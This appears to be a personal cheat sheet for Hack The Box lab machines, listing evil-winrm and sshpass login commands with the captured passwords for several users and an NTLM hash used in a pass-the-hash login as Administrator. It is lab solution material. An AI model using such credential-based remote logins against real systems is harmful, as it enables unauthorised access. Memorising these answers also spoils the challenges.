# HTB
% HTB

## Forest - login via winrm as svc-alfresco
```
evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

## Forest - login via winrm as Administrator
```
evil-winrm -u Administrator -i 10.10.10.161 -H 32693b11e6aa90eb43d32c72a07ceea6
```

## Resolute - login via winrm as Melanie
```
evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'
```

## Resolute - login via winrm as Ryan
```
evil-winrm -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'
```

## Sauna - login via winrm as FSmith
```
evil-winrm -i sauna.htb -u fsmith -p Thestrokes23
```

## Bastion - login via SSH as L4mpje
```
sshpass -p 'bureaulampje' ssh -o StrictHostKeyChecking=accept-new L4mpje@10.10.10.134 
```

## Codify - login via SSH as joshua
```
sshpass -p 'spongebob1' ssh -o StrictHostKeyChecking=accept-new joshua@codify.htb
```

## Previse - login via SSH as m4lwhere
```
sshpass -p 'ilovecody112235!' ssh -o StrictHostKeyChecking=accept-new m4lwhere@previse.htb
```